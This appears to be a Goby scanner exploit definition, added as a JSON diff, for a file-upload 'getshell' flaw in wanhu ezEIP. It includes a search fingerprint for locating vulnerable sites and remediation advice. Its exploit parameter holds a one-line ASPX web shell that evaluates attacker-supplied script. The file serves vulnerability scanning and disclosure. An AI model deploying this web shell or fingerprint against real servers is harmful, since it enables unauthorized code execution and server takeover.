@@ -1,0 +1,41 @@
+{
+  "Name": "ezEIP JQueryUploadify.aspx File Upload Getshell",
+  "Description": "Ezeip is a website management system of wanhu Network Technology Co., Ltd. There is a file upload vulnerability in ezeip front desk of wanhu Network Technology Co., Ltd., which can be used by attackers to obtain the privileges of server administrator",
+  "Product": "wanhu-ezEIP",
+  "Homepage": "http://www.wanhu.com.cn",
+  "DisclosureDate": "2021-06-04",
+  "Author": "sharecast.net@gmail.com",
+  "GobyQuery": "body=\"ezEip\" && body=\"Powered By wanhu\"",
+  "Level": "3",
+  "Impact": "<p>As a result, hackers can upload malicious files to the server to obtain the server permissions.<br></p>",
+  "Recommendation": "<p>1. The execution permission is disabled in the storage directory of the uploaded file.</p><p>2. File suffix white list.</p><p>3. Upgrade to the latest version.</p>",
+  "References": [
+    "https://wiki.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/ezEIP/%E4%B8%87%E6%88%B7%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8ezEIP%E5%89%8D%E5%8F%B0%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "cmd",
+      "type": "input",
+      "value": "<%@ Page Language=\"Jscript\"%><%Response.Write(eval(Request.Item[\"x\"],\"unsafe\"));%>"
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": null,
+  "ExploitSteps": null,
+  "Tags": [
+    "File Upload"
+  ],
+  "CVEIDs": null,
+  "CVSSScore": "0.0",
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
